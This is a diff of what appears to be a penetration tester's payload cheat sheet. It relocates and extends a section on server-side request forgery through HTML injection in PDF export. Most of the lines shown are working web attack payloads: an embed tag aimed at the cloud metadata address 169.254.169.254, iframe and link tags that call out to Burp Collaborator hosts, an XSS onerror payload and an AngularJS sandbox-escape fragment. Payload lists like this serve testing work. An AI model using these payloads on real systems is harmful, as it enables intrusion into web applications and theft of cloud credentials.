@@ -31,11 +31,6 @@ Encoded
 In json fields through burp:
 
 
-SSRF via xss/HTML Injection in PDF export
---------------------------------------------------------------------------------------------------------------------------------------------
-<embed type="text/plain" src="http://169.254.169.254/latest/meta-data/" width="1000" height="1000">
-
-
 -----------------------------
 <img src=x onerror=alert(1)>
 
@@ -105,6 +100,13 @@ Final payload: {{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,ale
 SSRF
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 http://169.254.169.254/latest/meta-data/
+
+
+SSRF via xss/HTML Injection in PDF export
+--------------------------------------------------------------------------------------------------------------------------------------------
+<embed type="text/plain" src="http://169.254.169.254/latest/meta-data/" width="1000" height="1000">
+<p><a href="http://uvt1kfn05gmuolletns0cvi5iwomcb.burpcollaborator.net">Click here</a></p>
+<iframe src="http://woo2fm1mtpgdzxamq74bqr0eg5mvak.burpcollaborator.net"></iframe>
 
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
